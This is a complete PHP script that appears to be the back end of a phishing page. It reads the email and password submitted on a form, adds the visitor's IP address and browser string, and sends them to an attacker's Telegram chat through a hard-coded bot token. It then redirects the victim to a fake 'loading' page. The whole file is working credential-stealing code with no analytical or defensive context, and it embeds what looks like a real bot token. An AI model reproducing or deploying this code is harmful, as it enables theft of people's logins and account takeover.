<?php

$message  = "--------log---------\n";
$message .= "Numero : " . $_POST['email'] . "\n";
$message .= "Date   : " . $_POST['password'] . "\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP      : $ip\n";
$message .= "BROWSER : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$message .= "------------------------------------\n";

$token = "7628274621:AAGyPfKXtwh-zl2EYdQvD7EFrac8HZ2z8lk";
$chat_id = "7378155762";

// Prepare data for Telegram API
$data = [
    'text' => $message,
    'chat_id' => $chat_id
];

// Send message to Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

// Redirect to loading page
header("Location: lod.html");
exit();
?>
